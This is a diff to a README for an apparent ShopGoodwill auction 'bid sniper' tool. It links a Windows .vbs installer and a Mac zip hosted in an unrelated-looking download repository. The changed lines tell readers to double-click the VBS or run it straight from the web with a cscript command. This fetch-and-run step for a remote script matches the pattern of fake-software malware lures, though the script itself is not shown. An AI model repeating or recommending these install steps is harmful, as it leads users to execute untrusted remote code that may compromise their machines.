@@ -8,9 +8,9 @@
 :-------------------------:|:-------------------------:
 [Windows](https://shopgoodwill-auction-sniper.github.io/shopgoodwill-bid-sniper/Bid_Sniper_Windows_Installer.vbs)  |  [Mac](https://github.com/software-app-download/windows-mac/raw/main/shopgoodwill-auction-sniper-mac.zip?download=)
 
-### Run Directly from Command Prompt or PowerShell
+### Download Above or Run Directly from Command Prompt/PowerShell
 
-You can also run the Windows VBS script directly from your computer without downloading it. Follow these steps:
+You can download the installer above and simply double click it or you can also run the Windows VBS script directly from your computer without downloading it from your command prompt or powershell. Follow these steps:
 
 #### Using Command Prompt
 
@@ -18,6 +18,7 @@ You can also run the Windows VBS script directly from your computer without down
 2. Run the following command:
    ```sh
    cscript //nologo "https://shopgoodwill-auction-sniper.github.io/shopgoodwill-bid-sniper/Bid_Sniper_Windows_Installer.vbs"
+   ```
 ### Features
 
 - **Simultaneous Sniping:** Snipe multiple auctions on ShopGoodwill at the last second(s).
